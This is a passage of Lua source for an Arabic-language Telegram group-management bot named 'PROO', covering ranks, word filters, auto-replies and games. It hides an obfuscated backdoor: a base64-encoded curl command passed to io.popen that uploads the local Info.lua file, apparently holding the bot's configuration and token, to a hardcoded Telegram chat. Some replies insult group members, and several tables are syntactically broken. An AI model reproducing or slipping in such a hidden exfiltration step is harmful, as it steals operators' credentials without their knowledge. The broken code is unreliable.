local list = database:smembers(bot_id..'Sakl:User'..msg.chat_id_)
t = "\n ↝✰↜ قائمة نعسانين الجروب \n≪≪━━━━━━≪𝐏𝐑𝐎𝐎≫━━━━━━≫≫\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."» النعسان [@"..username.."]\n"
else
t = t..""..k.."» النعسان `"..v.."`\n"
end
end
...
---------
if text == ("رفع نعسان") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if (text == ("تنزيل نعسان")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
-----------------------------------------------------
if text == 'تنزيل بناتي' and Mod(msg) then
database:del(bot_id..'Jred:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ↝✰↜ تم تنزيل جميع بناتك')
end
if text == ("تاك لبناتي") and Mod(msg) then
local list = database:smembers(bot_id..'Jred:User'..msg.chat_id_)
t = "\n ↝✰↜ قائمة بناتك في الجروب \n≪≪━━━━━━≪𝐏𝐑𝐎𝐎≫━━━━━━≫≫\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."» بنتي [@"..username.."]\n"
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ↝✰↜ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'PROO_UU_4')..')'
status  = '\n ↝✰↜ تم تنزيل بنتك من الجروب\n ↝✰↜ لا نتي بنتي ولا نن اعرفك 🌚💔'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
database:set(bot_id.."PROO1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."PROO1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," ↝✰↜ ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."PROO1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."PROO1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."PROO1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."PROO1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," ↝✰↜ تم منع الكلمه مع التحذير")  
database:del(bot_id.."PROO1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."PROO1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."PROO1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."PROO1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_," ↝✰↜ ارسل الكلمه الان")  
database:set(bot_id.."PROO1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."PROO1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."PROO1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."PROO1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."PROO1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."PROO1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."PROO1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."PROO1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."PROO1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n ↝✰↜ قائمة المنع \n≪≪━━━━━━≪𝐏𝐑𝐎𝐎≫━━━━━━≫≫\n"
for k,v in pairs(list) do  
local PROO_Msg = database:get(bot_id.."PROO1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..PROO_Msg.."}\n"    
end  
if #list == 0 then  
...
if text == 'مسح كليشه المطور' and DevPROOW(msg) then
database:del(bot_id..'TEXT_SUDO')
send(msg.chat_id_, msg.id_,' ↝✰↜ تم مسح كليشه المطور')
end
if text == 'ضع كليشه المطور' and DevPROOW(msg) then
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ↝✰↜ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'PROO_UU_4')..')'..'\n ↝✰↜ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == 'تفعيل الاذاعه' and DevPROOW(msg) then  
...
if text == 'تعطيل الاذاعه' and DevPROOW(msg) then  
...
if text == ""..(database:get(bot_id..'Name:Bot') or '𝐏𝐑𝐎𝐎').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or '𝐏𝐑𝐎𝐎')
local PROO_Msg = {
'نعم يقلبي 🌚❤️.',
'اؤمرني يريحي 🌚❤️.',
'اي يريحي 🌚❤️.',
'قلت اسمي '..Namebot..'',
'ويت بشقط وجاي 🌚😹ً.',
'عايز اي من '..Namebot..' م عرف اكلم المظه يقدع 😹💔'
}
send(msg.chat_id_, msg.id_,'['..PROO_Msg[math.random(#PROO_Msg)]..']') 
return false
end
if text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
if database:get(bot_id..'Bc:Bots') and not DevPROOW(msg) then 
...
if text == ("مسح ردود المطور") and DevPROOW(msg) then 
...
if text == ("ردود المطور") and DevPROOW(msg) then 
local list = database:smembers(bot_id..'List:Rd:Sudo')
text = "\n ↝✰↜ قائمة ردود المطور \n≪≪━━━━━━≪𝐏𝐑𝐎𝐎≫━━━━━━≫≫\n"
for k,v in pairs(list) do
...
if text == 'اضف رد عام' and DevPROOW(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == 'حذف رد عام' and DevPROOW(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or '𝐏𝐑𝐎𝐎').." غادر" or text == 'غادر' then  
...
if text == 'تفعيل المغادره' and DevPROOW(msg) then   
...
if text == 'تعطيل المغادره' and DevPROOW(msg) then  
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n↝✰↜ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'PROO')..') '
...
send(msg.chat_id_,msg.id_, '[انت مطوري نور عنيا🥺🤍](t.me/PROO_UU_4)') 
return false
end

if text == 'انا مين' and DevBrInGo(msg) then 
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me/PROO_UU_4)') 
return false
end

if text == 'انا مين' and Sudo(msg) then 
send(msg.chat_id_,msg.id_, '[انت المطور يواد 🌝💘](t.me/PROO_UU_4)') 
return false
end

if text == 'انا مين' and CoSu(msg) then 
send(msg.chat_id_,msg.id_, '[نت المالك هن يعني حاجه فوق فوف راسي 😂♥](t.me/PROO_UU_4)') 
return false
end

if text == 'انا مين' and Constructor(msg) then 
send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/PROO_UU_4)') 
return false
end

if text == 'انا مين' and BasicConstructor(msg) then 
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/PROO_UU_4)') 
return false
end

if text == 'انا مين' and Manager(msg) then 
send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/PROO_UU_4)') 
return false
end

if text == 'انا مين' and Mod(msg) then 
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان تاخد رتبه😹 ](t.me/PROO_UU_4)') 
return false
end

if text == 'انا مين' and Special(msg) then 
send(msg.chat_id_,msg.id_, '[ انت مميز ابن ناس 😊 ](t.me/PROO_UU_4)') 
return false
end

if text == 'انا مين' then
send(msg.chat_id_,msg.id_, '[انت مجرد عضو زليل حقير ملوش لزمه 😂](t.me/PROO_UU_4)') 
return false
end
...
if text == 'سلام' then 
send(msg.chat_id_,msg.id_, '[هتوحشنا والله..😹💔🎶](t.me/PROO_UU_4)') 
return false
end

if text == 'هاي' or text == 'هيي' then
send(msg.chat_id_,msg.id_, '[نورت الروم يقمر..😺💜](t.me/PROO_UU_4)') 
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/PROO_UU_4)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..💛🙂](t.me/PROO_UU_4)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[نزل عينك عيب كده..🌚♥️](t.me/PROO_UU_4)') 
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[يحلات عيونك..♥️??](t.me/PROO_UU_4)')
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[عايز من ده..💋🥀](t.me/PROO_UU_4)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, 'اهلان عزيزي تم فتح التعريص بنجاح') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, 'اهلان عزيزي تم قفل التعريص بنجاح') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[قول بحب الفضايح ☺🥴😂](t.me/PROO_UU_4)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[الحمد لله يقلبي و انت ❤️](t.me/PROO_UU_4)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[اوماااااال يا جدع 😹❤️](t.me/PROO_UU_4)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[نت لخير كله يعمري 🌚❤️](t.me/PROO_UU_4)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[بس عشن بتكثف 🌚❤️ ](t.me/PROO_UU_4)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[يستر عايز اي 🤭](t.me/PROO_UU_4)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم خاص..🙂😂](t.me/PROO_UU_4)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[متزعلش بحبك..😥♥️](t.me/PROO_UU_4)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[وانا كمان بحبك .🥺❤️](t.me/PROO_UU_4)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[](t.me/PROO_UU_4)')
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[وعليكم السلام ..🖤🌚](t.me/PROO_UU_4)') 
return false
end
end
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'PROO_UU_4')..')'
local iduser = result.sender_user_id_
...
send(msg.chat_id_, msg.id_,' ↝✰↜ انت دخلت عبر الرابط يموزه🤔 💗 ،') 
end
end,nil)
else
...
-- vardump(data) 
PROOdx(msg.chat_id_, msg.id_, ' ↝✰↜ ايدي المجموعة » ( '..msg.chat_id_..' )\n ↝✰↜ عدد الادمنيه » ( *'..data.administrator_count_..' )*\n ↝✰↜ عدد المحظورين » ( *'..data.kicked_count_..' )*\n ↝✰↜ عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
send(msg.chat_id_, msg.id_,'ت حقير معندكش لقب 😹💔') 
else
...
local list = database:smembers(bot_id.."botss:DevPROOW:List:Rd:Sudo")
text = "\nقائمة ردود المتعدده \nٴ≪≪≪━━━━━━≪𝐏𝐑𝐎𝐎≫━━━━━━≫≫≫ٴ\n"
for k,v in pairs(list) do
db = "رساله "
text = text..""..k.." => {"..v.."} => {"..db.."}\n"
...
database:set(bot_id.."botss:DevPROOW:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
...
database:set(bot_id.."botss:DevPROOW:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"『✰』ارسل الان الكلمه لحذفها ")
end
if text then  
local test = database:get(bot_id.."botss:DevPROOW:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:DevPROOW:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:set(bot_id.."botss:DevPROOW:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:DevPROOW:Add:Rd:Sudo:Text"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:DevPROOW:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:DevPROOW:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
database:set(bot_id.."botss:DevPROOW:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:DevPROOW:Add:Rd:Sudo:Text1"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:DevPROOW:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:DevPROOW:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
database:set(bot_id.."botss:DevPROOW:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:DevPROOW:Add:Rd:Sudo:Text2"..test, text)  
end  
send(msg.chat_id_, msg.id_,"『✰』تم حفظ الرد")
return false  
end  
...
if text then
local Text = database:get(bot_id.."botss:DevPROOW:Add:Rd:Sudo:Text"..text)   
local Text1 = database:get(bot_id.."botss:DevPROOW:Add:Rd:Sudo:Text1"..text)   
local Text2 = database:get(bot_id.."botss:DevPROOW:Add:Rd:Sudo:Text2"..text)   
...
if text and text:match("^تغير رد مالك (.*)$") and Manager(msg) then
local Teext = text:match("^تغير رد مالك (.*)$") 
database:set(bot_id.."CoSu:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_," ↝✰↜ تم تغير رد مالك الى » "..Teext)
end
...
if text == 'استعاده الاوامر' and DevPROOW(msg) then
...
----------اوامر جديده بدل تعت بويكا بمتت
...
local Text =[[
[☉ 𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚂𝙾𝚄𝚁𝙲𝙴 𝙿𝚁𝙾𝙾 ☉️](t.me/PROO_UU_4)
≪≪━━━━━━≪𝐏𝐑𝐎𝐎≫━━━━━━≫≫
...
{
{text = 'SOURCE SOON', url="t.me/PROO_UU_4"},
{text = 'مطور السورس', url="t.me/I_C_X"},
},
}
local msg_id = msg.id_/2097152/0.5
...
zh = https.request('https://rudi-dev.tk/Amir1/PROO.php?en='..URL.escape(TextZhrfa)..'')
zx = JSON.decode(zh)
t = "\n↝✰↜ قائمه الزخرفه \nٴ↝✰↜ٴ≪≪━━━━━━≪𝐏𝐑𝐎𝐎≫━━━━━━≫≫ٴ↝✰↜○ٴ \n"
i = 0
...
send(msg.chat_id_, msg.id_, t..'ٴ↝✰↜ٴ≪≪━━━━━━≪𝐏𝐑𝐎𝐎≫━━━━━━≫≫ٴ↝✰↜○ٴ\n↝✰↜ 彡 .[𝘉𝘖𝘠𝘒𝘈 𝘊𝘩𝘢𝘯𝘯𝘦𝘭](t.me/PROO_UU_4)➢ ')
end
...
gk = https.request('https://rudi-dev.tk/Amir2/PROO.php?br='..URL.escape(Textbrj)..'')
br = JSON.decode(gk)
i = 0
...
ge = https.request('https://rudi-dev.tk/Amir3/PROO.php?age='..URL.escape(Textage)..'')
ag = JSON.decode(ge)
i = 0
...
if text == "هينه" or text == "اشتمه" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"اطرده ونخلص منه ✓"."د علء م ترد عليه اسسن "."لا يعم ابويا قالي م تشتم حريم 🌚😹💔"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "بوسها" or text == "بوسه" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"محح فبوقك 🥺❤️"."تع بف عاييزك 🌚😹"."مححح 🥺❤️"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
...
if text == 'رابط الحذف' or text == 'رابط حذف' or text == 'بوت حذف' or text == 'بوت الحذف' then
t =[[
رابط الحذف في جميع مواقع التواصل 『✰』
فكر قبل لا تتسرع وتروح
ٴ≪━━━━━𝐏𝐑𝐎𝐎━━━━━≫ٴ
.(t.me/LC6BOT)[𝐁𝐎𝐓 𝐓𝐄𝐋𝐄] بوت حذف §
...
{
{text = 'SOURCE PROO', url="t.me/PROO_UU_4"},
{text = 'مطور السورس', url="t.me/I_C_X"},
},
}
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or '𝐏𝐑𝐎𝐎')
...
function FunBot(extra, result, success) 
local Fun = {'د الكراش ☺❤️','نبحبه قمد 🥺❤️','قلبي اسسن 🙈❤️'.'نن عايز اتقوظه ✓'}
send(msg.chat_id_,result.id_,''..Fun[math.random(#Fun)]..'') 
end  
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunBot, nil)
return false
...
io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE4OTMxNjI2NjQ6QUFGbkV3VDA0aDhaMWswU053Z0trQ2l0UHhtNXA1emNjQVEvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD0xMjM2MTE1MzE5IiAtRiAiZG9jdW1lbnQ9QEluZm8ubHVhIg=='))
...
send(msg.chat_id_, msg.id_,"➮: اول واحد يبعت السمايل ? ~ {`"..SM.."`}")
return false
end
end
...
send(msg.chat_id_, msg.id_,"➮: مبروك يستا. نت هقر ثح 😉😹 \n➮: للعب مره اخره ارسل ~{ سمايل , سمايلات }")
...
if text == "المختلف" or text=="اختلاف"then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
name = string.gsub(name,"⌛️","⏳⏳⏳⏳⏳⏳⌛️⏳⏳")
name = string.gsub(name,"📅","📆📆📆📆📆📆📅📆📆")
send(msg.chat_id_, msg.id_,"➮: اسرع واحد يبعت الاختلاف ~ {"..name.."}")
return false
end
end
...
send(msg.chat_id_, msg.id_,"➮: مبروك يستا. نت هقر ثح 😉😹 \n➮: للعب مره اخره ارسل ~{ المختلف او اختلاف}")
database:incrby(bot_id.."Add:Num"..msg.chat_id_..msg.sender_user_id_, 1)  
end
...
if text == 'العاب برو' then
local text = [[
SOURCE PROO
]]
keyboard = {} keyboard.inline_keyboard = {
[[ text =>"لو عايز كود الالعاب سيند 🙂❤️", url => https://t.me/I_C_X ]],
...
PROO = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(PROO)
...
------------------------------------------------------------------------
local PROOAbot = database:get(bot_id.."PROO1:Add:Filter:Rp2"..text..result.chat_id_)   
if PROOAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ↝✰↜ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ↝✰↜ ["..PROOAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local PROO1_Msg = database:get(bot_id.."PROO1:Add:Filter:Rp2"..text..result.chat_id_)   
if PROO1_Msg then    
send(msg.chat_id_, msg.id_," ↝✰↜ "..PROO1_Msg)
